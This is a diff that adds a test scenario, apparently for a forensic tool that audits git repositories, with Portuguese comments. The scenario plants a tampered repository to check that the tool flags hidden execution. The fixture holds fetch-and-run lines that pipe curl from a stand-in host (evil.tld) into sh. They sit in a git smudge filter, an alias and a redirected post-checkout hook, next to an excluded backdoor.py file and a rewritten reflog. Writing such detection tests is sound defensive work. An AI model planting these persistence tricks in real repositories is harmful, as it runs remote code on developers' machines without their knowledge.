@@ -11,6 +11,8 @@ package scenario
 //	I2  o dossiê de um processo cujo nome mente
 //	I3  o censo de REDE, com o leque de saída nomeado
 //	I4  a varredura de PORTAS, que entrava com o rótulo benigno de "pool"
+//	I5  o censo de um repositório ADULTERADO — config que executa, histórico
+//	    reescrito, e o que sumiu do `git status`
 
 func init() {
 	Register(Scenario{
@@ -142,5 +144,65 @@ func init() {
 		// E o rótulo benigno NÃO pode sair: era ele o defeito.
 		ForbidOutput: []string{"POOL"},
 		Exit:         0,
+	})
+
+	Register(Scenario{
+		ID:   "I5-repositorio-adulterado",
+		Desc: "backdoor commitado com --amend, hooks redirecionados e config que executa: o que a revisão de código não vê",
+		// O caso que originou o comando: invasor acrescenta backdoor, faz
+		// `--amend` para o commit revisado virar outro, e deixa a execução na
+		// CONFIG — que não é commitada, não aparece em diff, e sobrevive a
+		// `git pull`.
+		//
+		// Nada aqui é lido com `git`: tudo sai de arquivo, porque o git do host
+		// pode ser o implante. Por isso o plantio escreve os arquivos à mão em
+		// vez de chamar `git config`.
+		Images: []string{"debian:12"},
+		Cmd:    "info",
+		Args:   []string{"git", "/srv/app"},
+		Plant: `mkdir -p /srv/app/.git/logs /srv/app/.git/info /srv/fora
+			printf 'ref: refs/heads/main\n' > /srv/app/.git/HEAD
+			cat > /srv/app/.git/config <<'FIM'
+[core]
+	hooksPath = /srv/fora
+	fsmonitor = /tmp/.x/watch
+[remote "origin"]
+	url = git@github.com:empresa/app.git
+[filter "limpa"]
+	smudge = curl -s http://evil.tld/p | sh
+[alias]
+	st = "!sh -c 'curl -s http://evil.tld/b | sh'"
+FIM
+			printf '* filter=limpa\n' > /srv/app/.gitattributes
+			printf '/backdoor.py\n' > /srv/app/.git/info/exclude
+			printf '#!/bin/sh\ncurl -s http://evil.tld/x | sh\n' > /srv/fora/post-checkout
+			chmod +x /srv/fora/post-checkout
+			printf 'carga' > /srv/app/.git/.cache.bin
+			printf '%s %s invasor <i@evil.tld> 1755524332 +0000\tcommit: inicial\n' \
+				0000000000000000000000000000000000000000 aaaa000000000000000000000000000000000000 \
+				> /srv/app/.git/logs/HEAD
+			printf '%s %s invasor <i@evil.tld> 1755524399 +0000\tcommit (amend): fix typo\n' \
+				aaaa000000000000000000000000000000000000 bbbb000000000000000000000000000000000000 \
+				>> /srv/app/.git/logs/HEAD`,
+		ExpectOutput: []string{
+			"CENSO DE REPOSITÓRIO",
+			// quem rodou o git — o autor do commit é campo livre, isto não é
+			"QUEM MOVEU REF AQUI",
+			"invasor <i@evil.tld>",
+			// a config como superfície de execução
+			"O QUE ESTE REPOSITÓRIO EXECUTA",
+			"core.hookspath", "core.fsmonitor", "filter.limpa.smudge", "alias.st",
+			// o hook que não está onde se procura
+			"REDIRECIONADO por core.hooksPath",
+			// o amend, com o sha que devolve o que foi apagado
+			"HISTÓRICO REESCRITO",
+			"git cat-file -p aaaa",
+			// e os esconderijos
+			"ARQUIVO ESTRANHO DENTRO DO .GIT",
+			"ESCONDIDO DO GIT STATUS",
+			"/backdoor.py",
+		},
+		// O censo não conclui: não há achado, e portanto não há exit != 0.
+		Exit: 0,
 	})
 }
